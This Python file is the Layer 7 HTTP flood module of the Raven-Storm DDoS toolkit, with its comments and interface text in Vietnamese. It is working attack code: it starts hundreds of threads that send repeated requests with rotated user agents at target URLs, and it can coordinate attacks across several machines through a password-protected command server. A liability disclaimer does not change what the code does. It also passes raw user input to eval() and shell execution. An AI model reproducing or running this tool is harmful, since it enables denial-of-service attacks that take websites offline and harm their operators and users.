# 2020
# Bộ công cụ Raven-Storm được lập trình và phát triển bởi Taguar258.
# Bộ công cụ Raven-Storm được xuất bản theo Giấy phép MIT.
# Bộ công cụ Raven-Storm dựa trên CLIF-Framework.
# CLIF-Framework được lập trình và phát triển bởi Taguar258.
# CLIF-Framework được xuất bản theo Giấy phép MIT.

import urllib.request
from os import getcwd, name, path, system
from random import choice, randint
from sys import version
from threading import Thread
from time import sleep

import requests
from CLIF_Framework.framework import event  # noqa: I900
from CLIF_Framework.framework import tools  # noqa: I900

event = event()
tools = tools()


class Main:
	def __init__(selfie, console):  # noqa: N805
		global self
		global var
		self = selfie
		var = console  # noqa: VNE002

		self._add_commands()

		# Colors
		var.C_None = "\x1b[0;39m"
		var.C_Bold = "\x1b[1;39m"
		var.C_Green = "\x1b[32m"
		var.C_Violet = "\x1b[34m"
		var.C_Dark_Blue = "\x1b[35m"
		var.C_Red = "\x1b[31m"

		var.target = [""]
		var.threads = 400
		var.sleep = 0
		var.interval = 0
		var.run_active = True

		var.l7_debug = False
		var.stoped_threads = 0

		var.user_agents = ["Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)", "Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; pl-pl) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5", "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0", "Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; nb-no) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5", "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00", "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246", "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))", "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.37 Version/11.00", "Opera/9.80 (Windows NT 6.1; U; ko) Presto/2.7.62 Version/11.00", "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0", "Mozilla/5.0 (Windows NT 6.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36", "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; fr-fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5", "Mozilla/5.0 (iPhone; U; ru; CPU iPhone OS 4_2_1 like Mac OS X; fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5", "Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; en-gb) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5", "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30", "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)", "Opera/9.80 (X11; Linux i686; U; it) Presto/2.7.62 Version/11.00", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0", "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:27.0) Gecko/20121011 Firefox/27.0", "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30", "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)", "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01", "Mozilla/5.0 (iPhone; U; fr; CPU iPhone OS 4_2_1 like Mac OS X; fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; ru-ru) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_1 like Mac OS X; zh-tw) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5"]

	def _add_commands(self):
		event.commands(self.exit_console, ["exit", "quit", "e", "q"])
		event.commands(self.show_values, ["values", "ls"])
		event.command(self.help)

		event.commands(self.run_shell, ".")
		event.commands(self.debug, "$")

		event.help(["values", "ls"], "Hiển thị tất cả các tùy chọn.")

		event.help("target", "Đặt mục tiêu.")
		event.help("targets", "Đặt nhiều mục tiêu.")
		event.help("threads", "Số lượng chủ đề sẽ sử dụng.")
		event.help("sleep", "Độ trễ giữa các chuỗi.")
		event.help("interval", "Độ trễ giữa mỗi lần gửi gói.")
		event.help("agent", "Xác định một tác nhân người dùng thay vì một tác nhân ngẫu nhiên.")
		event.help("run", "Chạy bài kiểm tra căng thẳng.")

	def banner(self):
		system("clear || cls")
		print(("""C_B----------------------------------------------------------C_W
NGƯỜI SÁNG TẠO KHÔNG CHỊU BẤT CỨ TRÁCH NHIỆM NÀO VỀ THIỆT HẠI GÂY RA.
NGƯỜI DÙNG CŨNG PHẢI CHỊU TRÁCH NHIỆM
ĐỂ PHÙ HỢP VỚI CÁC MỤC ĐÍCH BẤT HỢP PHÁP HOẶC THIỆT HẠI TAI NẠN DO BÃO RAVEN gây ra.
BẰNG CÁCH SỬ DỤNG PHẦN MỀM NÀY, BẠN PHẢI ĐỒNG Ý CHỊU TRÁCH NHIỆM ĐẦY ĐỦ
ĐỐI VỚI BẤT KỲ THIỆT HẠI NÀO DO RAVEN-STORM gây ra.
MỌI Đòn tấn công SẼ gây ra THIỆT HẠI TẠM THỜI NHƯNG THIỆT HẠI DÀI HẠN LÀ
CÓ KHẢ NĂNG ĐÚNG CÁCH.
RAVEN-STORM KHÔNG NÊN ĐỀ XUẤT NHỮNG NGƯỜI THỰC HIỆN CÁC HOẠT ĐỘNG BẤT HỢP PHÁP.
C_B----------------------------------------------------------C_W""").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
		self.help()

	def exit_console(self):
		print("Chúc một ngày tốt lành.")
		quit()

	def run_shell(self, command):
		print("")
		system(tools.arg("Nhập lệnh shell: ", ". ", command))
		print("")

	def check_session(self):
		if var.session[1][0] and len(var.session[1][1]) >= 1:
			if len(var.session[1][1][0]) >= 1:
				run_following = [var.session[1][1][0][0], var.session[1][1][0][0]]
				var.session[1][1][0] = var.session[1][1][0][1:]
			else:
				var.session[1][1] = var.session[1][1][1:]
				run_following = [var.session[1][1][0][0], var.session[1][1][0][0]]
				var.session[1][1][0] = var.session[1][1][0][1:]
			var.run_command = run_following

	@event.event
	def on_input():
		self.check_session()
		if var.server[0] and not var.server[1]:
			while True:
				data = requests.post((var.server[2] + ("get/com%s" % var.server[4])), data={"password": var.server[3]}).text
				if data != "500":
					var.server[4] = var.server[4] + 1
					var.run_command = [data, data]
					print(var.ps1 + "\r")
					break
				else:
					sleep(1)

	def debug(self, command):
		print("")
		eval(tools.arg("Nhập lệnh gỡ lỗi: ", "$ ", command))
		print("")

	@event.command
	def clear():
		system("clear || cls")

	@event.event
	def on_ready():
		self.banner()

	@event.command
	def debug():
		var.l7_debug = True
		print("")
		print("Đã bật chế độ gỡ lỗi.")
		print("")

	@event.event
	def on_command_not_found(command):
		print("")
		print("Lệnh bạn đã nhập không tồn tại.")
		print("")

	@event.event
	def on_command(command):
		if var.session[0][0]:
			var.session[0][1].write(command + "\n")
		if var.server[0] and var.server[1]:
			status = requests.post((var.server[2] + "set/com"), data={"password": var.server[3], "data": command}).text
			if status != "200":
				print("")
				print("Đã xảy ra lỗi khi gửi lệnh tới máy chủ.")
				print("")

	@event.event
	def on_interrupt():
		print("")
		var.stop()

	def show_values(self):
		print("")
		print("Targets (Mục tiêu): %s" % var.target)
		print("Threads (Chủ đề): %s" % var.threads)
		print("Độ trễ giữa các chuỗi: %s" % var.sleep)
		print("Độ trễ giữa các gói: %s" % var.interval)
		if len(var.user_agents) == 1:
			print("Đại lý người dùng: %s" % var.user_agents[0])
		print("")

	def help(self):
		event.help_title("\x1b[1;39mL7 Help:\x1b[0;39m")
		tools.help("|-- ", " :: ", event)
		print("")

	@event.command
	def targets(command):
		print("")
		var.target = tools.arg("URLS (Seperated by ', '): ", "targets ", command).split(", ")
		for url in var.target:
			if "http" not in url:
				print("%s là một URL không hợp lệ." % url)
		print("")

	@event.command
	def target(command):
		print("")
		var.target = [tools.arg("URL (Có thể nhận được tham số): ", "target ", command)]
		if "http" not in var.target[0]:
			print("URL này không hợp lệ.")
		print("")

	@event.command
	def threads(command):
		print(" ")
		try:
			var.threads = int(tools.arg("Threads: ", "threads ", command))
		except Exception as e:
			print("Đã xảy ra lỗi khi thực thi.", e)
		print(" ")

	@event.command
	def sleep(command):
		print(" ")
		try:
			var.sleep = float(tools.arg("Độ trễ giữa mỗi chủ đề: ", "sleep ", command))
		except Exception as e:
			print("Đã xảy ra lỗi khi thực thi.", e)
		print(" ")

	@event.command
	def interval(command):
		print(" ")
		try:
			var.interval = float(tools.arg("Độ trễ giữa mỗi gói: ", "interval ", command))
		except Exception as e:
			print("Đã xảy ra lỗi khi thực thi.", e)
		print(" ")

	@event.command
	def agent(command):
		print(" ")
		var.user_agents = [tools.arg("Enter a user agent: ", "agent ", command)]
		print(" ")

	def ddos(self):
		while var.run_active:
			for url in var.target:
				try:
					response = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': choice(var.user_agents), "Connection": "keep-alive", "Accept-Encoding": "gzip, deflate", "Keep-Alive": randint(110,120)}), timeout=999)  # noqa
					var.command_log.append("Sucessful execution.")
				except Exception as ex:
					print("Request failed.")
					var.command_log.append("ERROR: %s" % ex)
					if var.l7_debug:
						print("ERROR: %s" % ex)
				print("Yêu cầu đã được nhận.")
			sleep(var.interval)
		var.stoped_threads += 1

	@event.command
	def run():
		def execute():
			print("")
			print("Để dừng cuộc tấn công, nhấn: ENTER hoặc CTRL + C")
			print("")

			var.ps1 = ""  # Change due to threading bug.

			sleep(3)
			for thread in range(var.threads):
				try:
					t = Thread(target=self.ddos)
					t.start()
					sleep(var.sleep)
				except Exception:
					print("Không thể bắt đầu chuỗi %s." % thread)

			def reset_attack():
				print("Đang dừng chuỗi...")
				var.run_active = False
				sleep(2)
				while True:
					if var.stoped_threads == var.threads:
						break
					else:
						sleep(1)

				if var.l7_debug:
					print("Đang lưu nhật ký gỡ lỗi...")
					output_to = path.join(getcwd(), "l7_debug_log.txt")

					write_method = "a"
					if path.isfile(output_to):
						write_method = "a"
					else:
						write_method = "w"

					output_file = open(output_to, write_method)
					if write_method == "a":
						output_file.write("------------- Nhật ký mới -------------")
					output_file.write(str(name + "\n"))
					output_file.write(str(version + "\n"))
					output_file.write(str("\n".join(var.command_log)))
					output_file.close()
				print("Xong.")
				quit()

			def check_stopped_execution():
				while True:
					data = requests.post((var.server[2] + "get/agreed"), data={"password": var.server[3]}).text
					if data != "True":
						reset_attack()
						break
					else:
						sleep(1)
			try:
				if var.server[0] and var.server[0]:
					rec_t = Thread(target=check_stopped_execution)
					rec_t.start()
				input("\r")
			except KeyboardInterrupt:
				pass

			if var.server[0] and var.server[1]:
				status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
				if status != "200":
					print("Đã xảy ra lỗi khi gửi dữ liệu đến máy chủ.")

			reset_attack()

		if var.server[0] and not var.server[1]:
			while True:
				data = requests.post((var.server[2] + "get/agreed"), data={"password": var.server[3]}).text
				if data == "True":
					execute()
					break
				else:
					sleep(1)
		elif not tools.question("\nBạn có đồng ý với các điều khoản sử dụng không?"):
			print("Thỏa thuận không được chấp nhận.")
			quit()
		else:
			if var.server[0] and var.server[1]:
				if tools.question("\nBạn có muốn sử dụng máy chủ lưu trữ như một phần của ddos?"):
					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
					if status != "200":
						print("Đã xảy ra lỗi khi gửi dữ liệu đến máy chủ.")
					execute()
				else:
					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
					if status != "200":
						print("Đã xảy ra lỗi khi gửi dữ liệu đến máy chủ.")
					try:
						print("[Nhấn Enter để dừng cuộc tấn công.]")
					except KeyboardInterrupt:
						pass
					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
					if status != "200":
						print("Đã xảy ra lỗi khi gửi dữ liệu đến máy chủ.")
			else:
				execute()


def setup(console):
	console.ps1 = "L7> "
	console.add(Main(console), event)
